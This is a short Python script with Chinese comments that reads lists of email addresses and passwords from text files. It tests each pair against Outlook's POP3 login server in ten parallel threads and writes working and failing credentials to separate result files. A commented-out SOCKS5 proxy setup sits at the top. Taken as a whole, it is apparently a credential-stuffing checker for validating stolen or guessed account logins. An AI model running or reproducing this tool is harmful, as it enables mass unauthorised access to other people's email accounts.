import poplib
import concurrent.futures
# import socks
# import socket

# 设置Socks5代理
# socks.set_default_proxy(socks.SOCKS5, "localhost", 10808)
# socket.socket = socks.socksocket

def check_outlook_login(email, password, timeout=60):
    try:
        mail = poplib.POP3_SSL('pop-mail.outlook.com', 995, timeout=timeout)
        mail.user(email)
        mail.pass_(password)
        mail.quit()
        return True
    except poplib.error_proto as e:
        print(f'错误原因 {email}: {e}')
        return False

# 从文件读取用户名和密码
with open('账号.txt', 'r', encoding='utf-8') as file1, open('密码.txt', 'r', encoding='utf-8') as file2:
    emails = file1.read().splitlines()
    passwords = file2.read().splitlines()

# 准备并发执行的输入
input_data = list(zip(emails, passwords))

# 检查登录状态并记录结果
results = {}

def test_account(email, password):
    print(f'正在测试的邮箱: {email}...')  # 输出正在测试的邮箱
    result = check_outlook_login(email, password)
    print(f'{email}: {"成功" if result else "失败"}')  # 输出测试结果
    return email, password, result

# 使用 ThreadPoolExecutor 并发执行
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    future_to_account = {executor.submit(test_account, email, password): (email, password) for email, password in input_data}
    for future in concurrent.futures.as_completed(future_to_account):
        email, password = future_to_account[future]
        try:
            email, password, result = future.result()
            results[email] = (password, result)
        except Exception as exc:
            print(f'{email} generated an exception: {exc}')

# 创建结果目录
import os
os.makedirs('结果', exist_ok=True)

# 将结果分别写入成功和失败的日志文件
with open(os.path.join('结果', '成功账号.txt'), 'w', encoding='utf-8') as success_file, open(os.path.join('结果', '失败账号.txt'), 'w', encoding='utf-8') as failure_file:
    for email, (password, status) in results.items():
        if status:
            success_file.write(f'账号: {email} \n密码: {password}\n成功\n\n')
        else:
            failure_file.write(f'账号: {email} \n密码: {password}\n失败\n\n')
